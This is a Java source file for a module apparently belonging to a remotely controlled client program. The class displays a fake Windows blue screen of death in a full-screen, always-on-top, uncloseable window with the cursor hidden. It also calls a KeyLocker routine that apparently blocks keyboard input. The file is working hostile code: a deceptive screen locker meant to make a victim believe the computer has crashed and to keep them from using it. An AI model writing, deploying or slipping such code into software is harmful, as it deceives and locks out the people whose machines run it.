package me.soda.witch.client.modules;

import me.soda.witch.client.utils.KeyLocker;

import javax.swing.*;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.util.ArrayList;
import java.util.List;

public class BSOD {
    JFrame frame = new JFrame();
    JPanel pnlData = new JPanel(new GridLayout(30, 1));

    JLabel lblTitle = new JLabel("Blue Screen Error");
    JLabel lblSpace = new JLabel("");
    List<String> lblText = new ArrayList<>();

    BufferedImage cursorImg = new BufferedImage(16, 16, BufferedImage.TYPE_INT_ARGB);
    Cursor blankCursor = Toolkit.getDefaultToolkit().createCustomCursor(cursorImg, new Point(0, 0), "blank");

    public BSOD() {
        lblText.add("  A problem has been detected and windows has been shut down to prevent damage");
        lblText.add("  to your computer.");
        lblText.add("");
        lblText.add("  The problem seems to be caused by the following file: WIN32K.SYS");
        lblText.add("");
        lblText.add("  PAGE_FAULT_IN_NONPAGED_AREA");
        lblText.add("");
        lblText.add("  If this is the first time you've seen this stop error screen,");
        lblText.add("  restart your computer. If this screen appears again, follow");
        lblText.add("  these steps:");
        lblText.add("");
        lblText.add("  check to make sure any new hardware or software is properly installed.");
        lblText.add("  If this is a new installation, ask your hardware or software manufacturer");
        lblText.add("  for any windows updates you might need.");
        lblText.add("");
        lblText.add("  If problems continue, disable or remove any newly installed hardware");
        lblText.add("  or software. Disable BIOS memory options such as caching or shadowing.");
        lblText.add("  If you need to use safe mode to remove or disable components, restart");
        lblText.add("  your computer, press F8 to select Advanced Startup Options, and then");
        lblText.add("  select Safe Mode.");
        lblText.add("");
        lblText.add("  Technical Information:");
        lblText.add("");
        lblText.add("  *** STOP 0x00000050 (0xFD3004C2, 0x00000000, 0xFFFFF250, 0x00000000)");
        lblText.add("");
        lblText.add("  Windows is dumping file: ");
        lblText.add("  *** DUMP_ERROR 0xC0000142");
        lblTitle.setForeground(Color.WHITE);
        lblTitle.setFont(new Font("Consolas", Font.PLAIN, 24));
        pnlData.setBackground(new Color(0, 0, 0x8b));

        frame.add(pnlData);
        frame.setBackground(Color.BLUE);
        frame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
        frame.setLocationRelativeTo(null);
        frame.setUndecorated(true);
        frame.setResizable(false);
        frame.setCursor(blankCursor);
        frame.setSize(100, 100);
        frame.setAlwaysOnTop(true);
        frame.setVisible(true);
        frame.setExtendedState(JFrame.MAXIMIZED_BOTH);
        pnlData.add(lblSpace);

        for (String text : lblText) {
            JLabel jLabel = new JLabel(text);
            jLabel.setForeground(Color.WHITE);
            jLabel.setFont(new Font("Courier New", Font.PLAIN, 24));
            pnlData.add(jLabel);
        }
    }


    public void toggle(boolean toggle) {
        frame.setVisible(toggle);
        KeyLocker.toggle(toggle);
    }
}
